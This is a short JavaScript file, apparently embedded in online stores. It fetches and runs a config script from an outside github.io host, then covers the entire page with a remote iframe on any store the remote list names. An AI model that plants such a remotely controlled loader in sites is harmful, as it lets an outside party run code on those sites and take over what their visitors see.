(function () {
  const BASE = 'https://shakilxvs.github.io/inspect';
  const CONFIG_URL = BASE + '/config.js';
  const INTERFACE_URL = BASE + '/interface.html';

  function loadScript(url, cb) {
    const s = document.createElement('script');
    s.src = url;
    s.async = true;
    s.onload = () => cb && cb(null);
    s.onerror = () => cb && cb(new Error('load-error'));
    document.head.appendChild(s);
  }

  function createIframeOverlay(cfg) {
    if (document.getElementById('remote-overlay-root')) return;

    const overlay = document.createElement('div');
    overlay.id = 'remote-overlay-root';
    Object.assign(overlay.style, {
      position: 'fixed',
      inset: '0',
      zIndex: '2147483647',
      /* default to the requested midnight blue so it fills the whole screen */
      background: (cfg && cfg.background) || '#272757',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '0',
      margin: '0',
      border: 'none',
      boxSizing: 'border-box',
      overflow: 'hidden'
    });

    // wrapper — keep full size so overlay background is visible; remove max width/padding
    const wrap = document.createElement('div');
    Object.assign(wrap.style, {
      width: '100%',
      height: '100%',
      maxWidth: '100%',
      maxHeight: '100vh',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '0',
      boxSizing: 'border-box',
      background: 'transparent'
    });

    // iframe that loads the interface HTML
    const iframe = document.createElement('iframe');
    iframe.id = 'remote-overlay-iframe';
    iframe.src = INTERFACE_URL + '?cb=' + Date.now(); // cache-bust while testing
    iframe.setAttribute('title', (cfg && cfg.title) || 'Remote Interface');
    Object.assign(iframe.style, {
      width: '100%',
      height: '100%',
      border: '0',
      /* remove rounded corners and shadow so the overlay background is uninterrupted */
      borderRadius: '0',
      boxShadow: 'none',
      overflow: 'hidden',
      display: 'block',
      background: 'transparent'
    });

    // ensure clicks inside overlay are handled normally
    iframe.setAttribute('allow', 'fullscreen');

    wrap.appendChild(iframe);
    overlay.appendChild(wrap);

    if (cfg && cfg.showCloseButton) {
      const closeBtn = document.createElement('button');
      closeBtn.textContent = 'Close';
      Object.assign(closeBtn.style, {
        position: 'fixed',
        right: '18px',
        top: '18px',
        zIndex: '2147483648',
        padding: '10px 14px',
        fontSize: '14px',
        cursor: 'pointer'
      });
      closeBtn.addEventListener('click', () => overlay.remove());
      overlay.appendChild(closeBtn);
    }

    (document.documentElement || document.body).appendChild(overlay);
  }

  // orchestrate
  loadScript(CONFIG_URL, (err) => {
    if (err) {
      console.warn('overlay config load failed', err && err.message);
      return;
    }
    try {
      const cfg = window.__overlayConfig || {};
      const host = window.location.hostname;
      const enabled = Array.isArray(cfg.enabledStores) && cfg.enabledStores.includes(host);
      if (enabled) createIframeOverlay(cfg.overlay || {});
    } catch (e) {
      console.warn('overlay init error', e && e.message);
    }
  });
})();
